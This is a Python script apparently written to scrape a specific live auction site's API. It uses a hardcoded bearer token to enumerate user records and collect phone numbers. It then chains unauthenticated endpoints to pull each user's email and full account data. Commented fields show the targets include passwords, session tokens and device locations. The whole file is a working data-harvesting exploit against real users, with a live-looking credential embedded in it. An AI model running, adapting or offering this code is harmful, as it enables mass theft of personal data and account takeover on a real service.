import requests
import json
from requests.structures import CaseInsensitiveDict

file = open('jinglebid_phoneno.txt', 'r')
file1 = open('jinglebid_users.txt', 'r')

url = "https://jinglebid.com/"
mob_uri = "api/v2/getAddress/"
for i in range(5):
    j = str(i)
    mob_url = url + mob_uri + j
    headers = CaseInsensitiveDict()
    headers["Accept"] = "application/json"
    headers[
        "Authorization"] = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyTmFtZSI6OTY5MTYsImlhdCI6MTYzMjkyMzAyNn0.qFBKNGVx_yslq4iFUQTcs5okCoITrWkbUrluyzUcK-k"
    mobile_number = requests.get(mob_url, headers=headers)
    mob = mobile_number.json()
    r = (json.dumps(mob, sort_keys=True, indent=4, separators=(',', ':')))
    res = json.loads(r)
    data1 = res["data"]
    for no in data1:
        num = no["Phone_Number"]
        file_object = open('jinglebid_phoneno.txt', 'a')
        file_object.write(num + "\n")
        file_object.close()

    # finding mail id
    # email_uri = "api/v2/verify-user"
    for each in file:
        x = str(each).rstrip()
        # en = "?userType=user&Phone_Number="
        email_url = "https://jinglebid.com/api/v2/verify-user?userType=user&Phone_Number=" + x

        email_id = requests.get(email_url)
        em = email_id.json()
        e = (json.dumps(em, sort_keys=True, indent=4, separators=(',', ':')))
        res = json.loads(e)
        data1 = res["data"]
        for email in data1:
            email_id = email["Email_ID"]
            print(email_id)

            # finding password
            q = "&Email_ID="
            pass_url = "https://www.jinglebid.com/api/v2/sign-verification?userType=user&Phone_Number=" + x + q + email_id
            password = requests.get(pass_url)
            print(pass_url)
            pas = (password.json())
            s = (json.dumps(pas, sort_keys=True, indent=4, separators=(',', ':')))
            db = json.loads(s)
            data5 = db
            print(data5)
            for k in data5:
                print(k)
                #Id = k['User_ID']
                #Name = k['User_Name']
                #mail = k['Email_ID']
                #gender = k['Gender']
                #password = k['Password']
                #mobilenumber = k['Phone_Number']
                #type = k['User_Type']
                #loc = k['Device_Location']
                #jwt = k['token']
                #img = k['Image']

                #all = (mail, jwt)
                #print (all)
                #file_object1 = open('jinglebid_users.txt', 'a')
                #file_object1.write(k + "\n")
                #file_object1.close()
                #print(mail)
